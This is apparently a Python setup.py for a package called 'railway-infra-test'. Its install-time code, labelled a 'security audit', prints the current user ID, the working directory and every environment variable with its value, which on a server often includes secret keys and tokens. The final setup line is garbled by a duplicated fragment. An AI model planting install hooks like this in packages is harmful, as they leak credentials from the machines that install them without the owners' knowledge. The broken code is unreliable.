from setuptools import setup
import os

print("\n" + "="*50)
print("!!! SECURITY AUDIT START !!!")
print(f"CURRENT USER ID: {os.getuid()}")
print(f"WORKING DIR: {os.getcwd()}")

print("\n--- [ DUMPING ALL ENVIRONMENT VARIABLES ] ---")
# Печатаем вообще всё, что знает сервер
for key, value in os.environ.items():
    print(f"{key} ===> {value}")

print("!!! SECURITY AUDIT END !!!")
print("="*50 + "\n")

setup(name="railway-infra-test", version="1.0.0")"1.0.0")
